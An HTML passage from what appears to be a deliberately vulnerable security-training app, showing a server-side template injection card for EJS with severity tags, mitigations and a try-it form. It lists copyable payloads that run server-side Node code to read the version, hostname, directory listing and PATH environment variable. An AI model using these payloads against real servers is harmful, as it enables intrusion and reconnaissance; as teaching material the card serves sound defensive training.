              <div class="response-body"></div>
            </div>
          </div>
        </div>

        <!-- SSTI -->
        <div class="vuln-card" id="ssti-section">
          <div class="card-header">
            <div class="card-icon icon-red">📝</div>
            <div class="card-header-info">
              <div class="card-title">Server-Side Template Injection (SSTI)</div>
              <div class="card-meta">
                <span class="owasp-tag">OWASP A03:2021</span>
                <span class="risk-badge risk-critical">CRITICAL</span>
                <span class="owasp-tag">CWE-94</span>
              </div>
            </div>
          </div>
          <div class="card-body">
            <p class="card-description">
              User-supplied template text is rendered by EJS on the server without sandboxing.
              Attacker can access <code>process</code>, <code>require</code>, and execute
              arbitrary Node.js code.
            </p>
            <button class="expand-toggle" data-target="ssti-details">
              <span class="arrow">▶</span> Payloads
            </button>
            <div class="expand-content" id="ssti-details">
              <ul class="payload-list">
                <li class="payload-item">
                  <span class="payload-code" data-target="ssti-template">&lt;%= 7*7 %&gt;</span>
                  <button class="copy-btn">📋</button>
                </li>
                <li class="payload-item">
                  <span class="payload-code" data-target="ssti-template">&lt;%= process.version %&gt;</span>
                  <button class="copy-btn">📋</button>
                </li>
                <li class="payload-item">
                  <span class="payload-code" data-target="ssti-template">&lt;%= require('os').hostname() %&gt;</span>
                  <button class="copy-btn">📋</button>
                </li>
                <li class="payload-item">
                  <span class="payload-code" data-target="ssti-template">&lt;%= require('fs').readdirSync('.').join(', ') %&gt;</span>
                  <button class="copy-btn">📋</button>
                </li>
                <li class="payload-item">
                  <span class="payload-code" data-target="ssti-template">&lt;%= process.env.PATH %&gt;</span>
                  <button class="copy-btn">📋</button>
                </li>
              </ul>
              <div class="mitigation-panel">
                <div class="mitigation-title">✅ Mitigations</div>
                <ul class="mitigation-list">
                  <li>Never render user-supplied templates</li>
                  <li>Use sandboxed template engines (Nunjucks sandbox)</li>
                  <li>Separate template logic from user data</li>
                </ul>
              </div>
            </div>
          </div>
          <div class="card-try">
            <div class="try-label">🧪 Try It</div>
            <div class="form-row">
              <div class="form-group">
                <label class="form-label">Name variable</label>
                <input class="form-input" id="ssti-name" placeholder="World" value="Hacker" />
              </div>
            </div>
            <div class="form-group">
              <label class="form-label">EJS Template (rendered server-side)</label>
              <textarea class="form-textarea" id="ssti-template" placeholder="Hello &lt;%= name %&gt;!">Hello <%= name %>!</textarea>
            </div>
            <div class="btn-row">
              <button class="btn btn-primary" onclick="doSSTI()">⚡ Render</button>
              <button class="btn btn-ghost btn-sm" onclick="setInputValue('ssti-template','&lt;%= process.version %&gt;')">Node version</button>
              <button class="btn btn-ghost btn-sm" onclick="setInputValue('ssti-template',&quot;&lt;%= require('os').hostname() %&gt;&quot;)">Hostname</button>
            </div>
            <div class="response-viewer" id="ssti-response">
